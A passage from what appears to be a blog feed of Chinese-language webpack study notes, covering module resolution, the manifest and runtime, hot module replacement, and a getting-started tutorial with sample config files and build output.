<p><strong>注意：</strong> webpack 1 需要特定的 loader 来转换 ES 2015 <code>import</code>，然而通过 webpack 2 可以开箱即用。 </p>
<h2 id="支持的模块类型"><a href="#支持的模块类型" class="headerlink" title="支持的模块类型"></a>支持的模块类型</h2><p>CoffeeScript、TypeScript、ESNext (Babel)、Sass、Less、Stylus。</p>
<p>webpack 通过 loader 可以支持各种语言和预处理器编写模块。loader 描述了 webpack 如何处理 非 JavaScript(non-JavaScript) <em>模块</em>，并且在bundle中引入这些<em>依赖</em>。</p>
<h1 id="模块解析-Module-Resolution"><a href="#模块解析-Module-Resolution" class="headerlink" title="模块解析(Module Resolution)"></a>模块解析(Module Resolution)</h1><p>resolver 是一个库(library)，用于帮助找到引入模块的绝对路径。当打包模块时，webpack 使用 <code>enhanced-resolve</code> 来解析文件路径。</p>
<h2 id="webpack-中的解析规则"><a href="#webpack-中的解析规则" class="headerlink" title="webpack 中的解析规则"></a>webpack 中的解析规则</h2><p>使用 <code>enhanced-resolve</code>，webpack 能够解析三种文件路径：</p>
<p><strong>绝对路径</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="string">"/home/me/file"</span>;</div><div class="line"></div><div class="line"><span class="keyword">import</span> <span class="string">"C:\\Users\\me\\file"</span>;</div></pre></td></tr></table></figure></p>
<p><strong>相对路径</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="string">"../src/file1"</span>;</div><div class="line"><span class="keyword">import</span> <span class="string">"./file2"</span>;</div></pre></td></tr></table></figure></p>
<p>此时，使用 <code>import</code> 或 <code>require</code> 的资源文件(resource file)所在的目录被认为是上下文目录(context directory)。在 <code>import/require</code> 中给定的相对路径，会添加此上下文路径(context path)，以产生模块的绝对路径(absolute path)。</p>
<p><strong>模块路径</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="string">"module"</span>;</div><div class="line"><span class="keyword">import</span> <span class="string">"module/lib/file"</span>;</div></pre></td></tr></table></figure></p>
<p>模块将在 <code>resolve.modules</code> 中指定的所有目录内搜索。 可以替换初始模块路径，此替换路径通过使用 <code>resolve.alias</code> 配置选项来创建一个别名。</p>
<p>接下来，解析器(resolver)将检查路径是否指向文件或目录。如果路径指向一个文件：</p>
<ul>
<li>如果路径具有文件扩展名，则被直接将文件打包。</li>
<li>否则，将使用 [<code>resolve.extensions</code>] 选项作为文件扩展名来解析，此选项告诉解析器在解析中能够接受哪些扩展名（例如 .js, .jsx）</li>
</ul>
<p>如果路径指向一个文件夹，则采取以下步骤找到具有正确扩展名的正确文件：</p>
<ul>
<li>如果文件夹中包含 <code>package.json</code> 文件，则按照顺序查找 <code>resolve.mainFields</code> 配置选项中指定的字段，并且 <code>package.json</code> 中的第一个这样的字段确定文件路径</li>
<li>如果 <code>package.json</code> 文件不存在或者 <code>package.json</code> 文件中的 main 字段没有返回一个有效路径，则按照顺序查找 <code>resolve.mainFiles</code> 配置选项中指定的文件名，看是否能在 import/require 目录下匹配到一个存在的文件名。</li>
<li>文件扩展名通过 <code>resolve.extensions</code> 选项采用类似的方法进行解析。</li>
</ul>
<h2 id="解析-Loader-Resolving-Loaders"><a href="#解析-Loader-Resolving-Loaders" class="headerlink" title="解析 Loader(Resolving Loaders)"></a>解析 Loader(Resolving Loaders)</h2><p>Loader 解析遵循与文件解析器指定的规则相同的规则。但是 <code>resolveLoader</code> 配置选项可以用来为 Loader 提供独立的解析规则。</p>
<h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p>每个文件系统访问都被缓存，以便更快触发对同一文件的多个并行或串行请求。在观察模式下，只有修改过的文件会从缓存中摘出。如果关闭观察模式，在每次编译前清理缓存。</p>
<h1 id="依赖图-Dependency-Graph"><a href="#依赖图-Dependency-Graph" class="headerlink" title="依赖图(Dependency Graph)"></a>依赖图(Dependency Graph)</h1><p>一个文件依赖于另一个文件，webpack 就把此视为文件之间有依赖关系。这使得 webpack 可以接收非代码资源(non-code asset)（例如图像或 web 字体），并且可以把它们作为<em>依赖</em>提供给你的应用程序。</p>
<p>webpack 从命令行或配置文件中定义的一个模块列表开始，处理你的应用程序。 从这些入口起点开始，webpack 递归地构建一个依赖图，这个依赖图包含着应用程序所需的每个模块，然后将所有这些模块打包为少量的 bundle (通常只有一个)可由浏览器加载。</p>
<p><strong>补充：</strong><br>对于 HTTP/1.1 客户端，由 webpack 打包你的应用程序会尤其强大，因为在浏览器发起一个新请求时，它能够减少应用程序必须等待的时间。<br>对于 HTTP/2，你还可以使用代码拆分(Code Splitting)以及通过 webpack 打包来实现最佳优化。</p>
<h1 id="Manifest"><a href="#Manifest" class="headerlink" title="Manifest"></a>Manifest</h1><p>在使用 webpack 构建的典型应用程序或站点中，有三种主要的代码类型：</p>
<ul>
<li>你或你的团队编写的源码。</li>
<li>你的源码会依赖的任何第三方的 library 或 “vendor” 代码。</li>
<li>webpack 的 runtime 和 manifest，管理所有模块的交互。</li>
</ul>
<h2 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h2><p>runtime，以及伴随的 manifest 数据，主要是指：在浏览器运行时，webpack 用来连接模块化的应用程序的所有代码。</p>
<p>runtime 包含：在模块交互时，连接模块所需的加载和解析逻辑。包括浏览器中的已加载模块的连接，以及懒加载模块的执行逻辑。</p>
<h2 id="Manifest-1"><a href="#Manifest-1" class="headerlink" title="Manifest"></a>Manifest</h2><p>当编译器(compiler)开始执行、解析和映射应用程序时，Manifest会保留所有模块的详细要点，这个数据集合称为 “Manifest”，当完成打包并发送到浏览器时，会在运行时通过 Manifest 来解析和加载模块。</p>
<p>无论你选择哪种模块语法，那些 <code>import</code> 或 <code>require</code> 语句现在都已经转换为 <code>__webpack_require__</code> 方法，此方法指向模块标识符(module identifier)。通过使用 manifest 中的数据，runtime 将能够查询模块标识符，检索出背后对应的模块。</p>
<h2 id="缓存优化"><a href="#缓存优化" class="headerlink" title="缓存优化"></a>缓存优化</h2><p>通过manifest，使用浏览器缓存来改善项目的性能。</p>
<p>通过使用 bundle 计算出内容散列(content hash)作为文件名称，这样在内容或文件修改时，浏览器中将通过新的内容散列指向新的文件，从而使缓存无效。</p>
<h1 id="构建目标-Targets"><a href="#构建目标-Targets" class="headerlink" title="构建目标(Targets)"></a>构建目标(Targets)</h1><p>因为服务器和浏览器代码都可以用 JavaScript 编写，所以 webpack 提供了多种构建目标(target)。</p>
<h2 id="用法-2"><a href="#用法-2" class="headerlink" title="用法"></a>用法</h2><p><strong>webpack.config.js</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  target: <span class="string">'node'</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>使用 <code>node</code> webpack 会编译为用于「类 Node.js」环境（使用 Node.js 的 <code>require</code> ，而不是使用任意内置模块（如 <code>fs</code> 或 <code>path</code>）来加载 chunk）。</p>
<h2 id="多个-Target-1"><a href="#多个-Target-1" class="headerlink" title="多个 Target"></a>多个 Target</h2><p>webpack 不支持向 <code>target</code> 传入多个字符串，可以通过打包两份分离的配置来创建同构的库:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</div><div class="line"><span class="keyword">var</span> serverConfig = &#123;</div><div class="line">  target: <span class="string">'node'</span>,</div><div class="line">  output: &#123;</div><div class="line">    path: path.resolve(__dirname, <span class="string">'dist'</span>),</div><div class="line">    filename: <span class="string">'lib.node.js'</span></div><div class="line">  &#125;</div><div class="line">  <span class="comment">//…</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">var</span> clientConfig = &#123;</div><div class="line">  target: <span class="string">'web'</span>, <span class="comment">// &lt;=== 默认是 'web'，可省略</span></div><div class="line">  output: &#123;</div><div class="line">    path: path.resolve(__dirname, <span class="string">'dist'</span>),</div><div class="line">    filename: <span class="string">'lib.js'</span></div><div class="line">  &#125;</div><div class="line">  <span class="comment">//…</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = [ serverConfig, clientConfig ];</div></pre></td></tr></table></figure></p>
<h1 id="模块热替换-Hot-Module-Replacement"><a href="#模块热替换-Hot-Module-Replacement" class="headerlink" title="模块热替换(Hot Module Replacement)"></a>模块热替换(Hot Module Replacement)</h1><p>模块热替换(HMR - Hot Module Replacement)功能会在应用程序运行过程中替换、添加或删除模块，而无需重新加载整个页面。主要是通过以下几种方式，来显著加快开发速度：</p>
<ul>
<li>保留在完全重新加载页面时丢失的应用程序状态。</li>
<li>只更新变更内容，以节省宝贵的开发时间。</li>
<li>调整样式更加快速 - 几乎相当于在浏览器调试器中更改样式。</li>
</ul>
<h2 id="在应用程序中"><a href="#在应用程序中" class="headerlink" title="在应用程序中"></a>在应用程序中</h2><p>通过以下步骤，可以做到在应用程序中置换(swap in and out)模块：</p>
<pre><code>1.应用程序代码要求 HMR runtime 检查更新。
2.HMR runtime（异步）下载更新，然后通知应用程序代码。
3.应用程序代码要求 HMR runtime 应用更新。
4.HMR runtime（异步）应用更新。
</code></pre><p>可以设置 HMR，以使此进程自动触发更新，或者你可以选择要求在用户交互时进行更新。</p>
<h2 id="在编译器中"><a href="#在编译器中" class="headerlink" title="在编译器中"></a>在编译器中</h2><p>除了普通资源，编译器(compiler)需要发出 “update”，以允许更新之前的版本到新的版本。”update” 由两部分组成：</p>
<pre><code>1.更新后的 manifest(JSON)
2.一个或多个更新后的 chunk (JavaScript)
</code></pre><p>manifest 包括新的编译 hash 和所有的待更新 chunk 目录。每个更新 chunk 都含有对应于此 chunk 的全部更新模块（或一个 flag 用于表明此模块要被移除）的代码。</p>
<p>编译器确保模块 ID 和 chunk ID 在这些构建之间保持一致。通常将这些 ID 存储在内存中（例如，使用 webpack-dev-server 时），但是也可能将它们存储在一个 JSON 文件中。</p>
<h2 id="在模块中"><a href="#在模块中" class="headerlink" title="在模块中"></a>在模块中</h2><p>HMR 是可选功能，只会影响包含 HMR 代码的模块。举个例子，通过 <code>style-loader</code> 为 style 样式追加补丁。 为了运行追加补丁，<code>style-loader</code> 实现了 HMR 接口；当它通过 HMR 接收到更新，它会使用新的样式替换旧的样式。</p>
<p>类似的，当在一个模块中实现了 HMR 接口，你可以描述出当模块被更新后发生了什么。然而在多数情况下，不需要强制在每个模块中写入 HMR 代码。如果一个模块没有 HMR 处理函数，更新就会冒泡。这意味着一个简单的处理函数能够对整个模块树(complete module tree)进行更新。如果在这个模块树中，一个单独的模块被更新，那么整组依赖模块都会被重新加载。</p>
<h2 id="在-HMR-Runtime-中"><a href="#在-HMR-Runtime-中" class="headerlink" title="在 HMR Runtime 中"></a>在 HMR Runtime 中</h2><p>对于模块系统的 runtime，附加的代码被发送到 <code>parents</code> 和 <code>children</code> 跟踪模块。在管理方面，runtime 支持两个方法 <code>check</code> 和 <code>apply</code>。</p>
<p><code>check</code> 发送 HTTP 请求来更新 manifest。如果请求失败，说明没有可用更新。如果请求成功，待更新 chunk 会和当前加载过的 chunk 进行比较。对每个加载过的 chunk，会下载相对应的待更新 chunk。当所有待更新 chunk 完成下载，就会准备切换到 <code>ready</code> 状态。</p>
<p><code>apply</code> 方法将所有被更新模块标记为无效。对于每个无效模块，都需要在模块中有一个更新处理函数，或者在它的父级模块们中有更新处理函数。否则，无效标记冒泡，并也使父级无效。每个冒泡继续直到到达应用程序入口起点，或者到达带有更新处理函数的模块（以最先到达为准）。如果它从入口起点开始冒泡，则此过程失败。</p>
<p>之后，所有无效模块都被（通过 <code>dispose</code> 处理函数）处理和解除加载。然后更新当前 <code>hash</code>，并且调用所有 “accept” 处理函数。runtime 切换回闲置状态，一切照常继续。</p>
<p>在开发过程中，可以将 HMR 作为 LiveReload 的替代。webpack-dev-server 支持 <code>hot</code> 模式，在试图重新加载整个页面之前，热模式会尝试使用 HMR 来更新。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;关于webapck相关概念的学习总结。&lt;br&gt;
    
    </summary>
    
      <category term="Webpack" scheme="http://yoursite.com/categories/Webpack/"/>
    
    
      <category term="Webpack" scheme="http://yoursite.com/tags/Webpack/"/>
    
  </entry>
  
  <entry>
    <title>(一)Webpack入门总结</title>
    <link href="http://yoursite.com/2018/05/14/webpack-start-first/"/>
    <id>http://yoursite.com/2018/05/14/webpack-start-first/</id>
    <published>2018-05-14T01:06:21.000Z</published>
    <updated>2018-05-29T02:33:34.808Z</updated>
    
    <content type="html"><![CDATA[<p>关于webpck基本使用的入门总结。<br><a id="more"></a><br><strong>webpack版本【webpack@4.8.3】</strong></p>
<p><strong>补充：</strong><br>(1)git bash新建文件的命令：<code>touch index.html</code>（再别忘记了！！！）</p>
<h1 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h1><h2 id="下载安装及配置-Basic-Setup"><a href="#下载安装及配置-Basic-Setup" class="headerlink" title="下载安装及配置(Basic Setup)"></a>下载安装及配置(Basic Setup)</h2><p>例如在桌面新建一个目录，使用npm初始化，然后利用npm命令本地安装<code>webpack</code>，再安装<code>webpack-cli</code>(用于在命令行上运行webpack的工具)：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mkdir webpack-demo &amp;&amp; <span class="built_in">cd</span> webpack-demo</div><div class="line">npm init -y</div><div class="line">npm install webpack webpack-cli --save-dev</div></pre></td></tr></table></figure>
<p>其中<code>npm init -y</code>表示在初始化创建package.json的过程中跳过提问阶段，直接生成一个新的package.json文件,类似的<code>npm init -f</code>也会跳过提问阶段。 </p>
<p>npm初始化语法：<code>npm init [--force|-f|--yes|-y|--scope]</code></p>
<p>在项目的根目录下，及webpack-demo下创建以下目录结构，具体目录结构及相应文件内容如下：</p>
<p><strong>项目目录结构</strong></p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/webpack-demo/%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png" alt="目录结构"></p>
<p><strong>src/index.js</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">component</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> element = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</div><div class="line"></div><div class="line">    <span class="comment">// 借助了Lodash(一个js工具库，作用是降低array、number、object等使用难度)，</span></div><div class="line">    <span class="comment">// _ 是假定存在的一个Lodash全局对象，将js方法挂载在 _ 这个全局对象变量上。</span></div><div class="line">    element.innerHTML = _.join([<span class="string">'Hello'</span>,<span class="string">'webpack'</span>],<span class="string">' '</span>);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> element;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">document</span>.body.appendChild(component());</div></pre></td></tr></table></figure>
<p><strong>index.html</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Getting Started<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://unpkg.com/lodash@4.16.6"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./src/index.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>修改package.json文件，增加<code>private</code>字段使我们的包私有化，同时删除<code>main</code>字段。这是为了防止意外发布我们的代码。<strong><a href="https://docs.npmjs.com/files/package.json" target="_blank" rel="noopener">更多关于package.json的内部机制见npm文档</a></strong> , package.json修改如下：</p>
<p><strong>package.json</strong></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  <span class="attr">"name"</span>: <span class="string">"webpack-demo"</span>,</div><div class="line">  <span class="attr">"version"</span>: <span class="string">"1.0.0"</span>,</div><div class="line">  <span class="attr">"description"</span>: <span class="string">""</span>,</div><div class="line">  <span class="attr">"private"</span>: <span class="literal">true</span>,</div><div class="line">  <span class="attr">"scripts"</span>: &#123;</div><div class="line">    <span class="attr">"test"</span>: <span class="string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span></div><div class="line">  &#125;,</div><div class="line">  <span class="attr">"keywords"</span>: [],</div><div class="line">  <span class="attr">"author"</span>: <span class="string">""</span>,</div><div class="line">  <span class="attr">"license"</span>: <span class="string">"ISC"</span>,</div><div class="line">  <span class="attr">"devDependencies"</span>: &#123;</div><div class="line">    <span class="attr">"webpack"</span>: <span class="string">"4.8.3"</span>,</div><div class="line">    <span class="attr">"webpack-cli"</span>: <span class="string">"2.1.3"</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>index.html中的<code>&lt;script&gt;</code>标签之间存在隐式依赖关系，index.js的运行依赖于<code>lodash</code>。虽然index.js没有显式声明与<code>lodash</code>的关系，但它假设全局变量 <code>_</code> 存在。</p>
<p>上述方式管理javascript项目存在的问题：</p>
<ul>
<li>脚本对于外部库的依赖并不是显而易见的。(index.js没有显式声明与<code>lodash</code>的关系，假设全局变量 <code>_</code> 存在，表明index.js调用了lodash库)</li>
<li>如果依赖缺失或引入顺序有误，应用程序将无法运行。</li>
<li>如果引入的依赖并未使用，浏览器将下载不必要的代码。</li>
</ul>
<p>接下来使用webpack来管理脚本。</p>
<h2 id="创建一个捆绑-Creating-a-Bundle"><a href="#创建一个捆绑-Creating-a-Bundle" class="headerlink" title="创建一个捆绑(Creating a Bundle)"></a>创建一个捆绑(Creating a Bundle)</h2><p>首先调整目录结构，将“源”代码（<code>/src</code>）与“分发”代码（<code>/dist</code>）分开。“源代码”是需要编写和编辑的代码，“分发”代码是构建过程的最小化和最优输出，并且最终将在浏览器中加载。修改后的目录结构如下：</p>
<p><strong>目录结构</strong><br><img src="http://ou3oh86t1.bkt.clouddn.com/webpack-demo/%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png" alt="修改后的目录结构"></p>
<p>为了捆绑<code>lodash</code>与index.js之间的依赖关系，需要在本地安装lodash库，命令如下：<code>npm install --save lodash</code>。</p>
<p><strong>注意：</strong> 安装生产环境中用到的包时，需要使用<code>npm install --save</code>，开发环境时，使用<code>npm install --save-dev</code>。</p>
<p>接下来就可以在脚本中引入<code>lodash</code>，如下：</p>
<p><strong>src/index.js</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> _ <span class="keyword">from</span> <span class="string">'lodash'</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">component</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> element = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</div><div class="line"></div><div class="line">    <span class="comment">// lodash,通过此脚本引入</span></div><div class="line">    element.innerHTML = _.join([<span class="string">'Hello'</span>,<span class="string">'webpack'</span>],<span class="string">' '</span>);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> element;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">document</span>.body.appendChild(component());</div></pre></td></tr></table></figure></p>
<p>接下来需要更新index.html文件，首先去掉包含lodash的<code>&lt;script&gt;</code>标签，因为在index.js文件中通过<code>import</code>引入过了，然后修改另一个<code>&lt;script&gt;</code>标签来加载捆绑代替原来的<code>/src</code>文件：</p>
<p><strong>dist/index.html</strong><br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Getting Started<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!-- &lt;script src="https://unpkg.com/lodash@4.16.6"&gt;&lt;/script&gt; --&gt;</span></div><div class="line">    <span class="comment">&lt;!-- &lt;script src="./src/index.js"&gt;&lt;/script&gt; --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"bundle.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>设置中，index.js明确要求lodash存在，并以 <code>_</code> （没有全局范围污染）绑定依赖关系。通过说明模块需要什么依赖关系，webpack可以使用这些信息来构建依赖关系图，然后使用该图生成一个优化的包，其中脚本将按正确的顺序执行。</p>
<p>运行<code>npx webpack</code>，以<code>src/index.js</code>脚本作为入口点，以<code>bundle.js</code>作为输出。<br><code>npx</code>命令：需要Node 8.2或更高版本，会运行webpack的二进制文件（<code>./node_modules/.bin/webpack</code>）。结果如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">$ npx webpack</div><div class="line">npx: 1 安装成功，用时 3.16 秒</div><div class="line">Path must be a string. Received undefined</div><div class="line">C:\Users\Shirley\Desktop\webpack-demo\node_modules\webpack\bin\webpack.js</div><div class="line">Hash: ac9a5fb5c51baf1f8804</div><div class="line">Version: webpack 4.8.3</div><div class="line">Time: 3225ms</div><div class="line">Built at: 2018-05-13 21:35:31</div><div class="line">  Asset    Size  Chunks             Chunk Names</div><div class="line">main.js  70 KiB       0  [emitted]  main</div><div class="line">Entrypoint main = main.js</div><div class="line">[1] (webpack)/buildin/module.js 519 bytes &#123;0&#125; [built]</div><div class="line">[2] (webpack)/buildin/global.js 509 bytes &#123;0&#125; [built]</div><div class="line">[3] ./src/index.js 253 bytes &#123;0&#125; [built]</div><div class="line">    + 1 hidden module</div><div class="line"></div><div class="line">WARNING <span class="keyword">in</span> configuration</div><div class="line">The <span class="string">'mode'</span> option has not been <span class="built_in">set</span>, webpack will fallback to <span class="string">'production'</span> <span class="keyword">for</span> this value. Set <span class="string">'mode'</span> option to <span class="string">'development'</span> or <span class="string">'production'</span> to <span class="built_in">enable</span> defaults <span class="keyword">for</span> each environment.</div><div class="line">You can also <span class="built_in">set</span> it to <span class="string">'none'</span> to <span class="built_in">disable</span> any default behavior. Learn more: https://webpack.js.org/concepts/mode/</div></pre></td></tr></table></figure>
<p>接下来在浏览器中打开index.html，如果打包成功会显示文本 ‘Hello webpack’。</p>
<p><strong>注意踩坑！！！</strong> 这里照着文档一步步来，发现浏览器没有文本内容，检查后发现，在index.html文件中引入打包后的脚本文件时示例代码给的打包脚本名字为<code>bundle.js</code>，但使用<code>npx webpack</code>生成的打包脚本名称为<code>main.js</code>,所以导致index.html文件没有正确的引入打包脚本文件。<code>dist/index.html</code>修改如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Getting Started<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"main.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>上面的坑在英文文档中，后来看了中文文档发现中文的改过来了。。</p>
<p>打包后的目录结构如下：<br><img src="http://ou3oh86t1.bkt.clouddn.com/webpack-demo/%E6%89%93%E5%8C%85%E5%90%8E%E7%9A%84%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png" alt="打包后的目录结构"></p>
<h2 id="模块-Modules"><a href="#模块-Modules" class="headerlink" title="模块(Modules)"></a>模块(Modules)</h2><p>在ES2015中<code>import</code>和<code>export</code>声明已经标准化，尽管大部分浏览器还不支持，但webpack支持。</p>
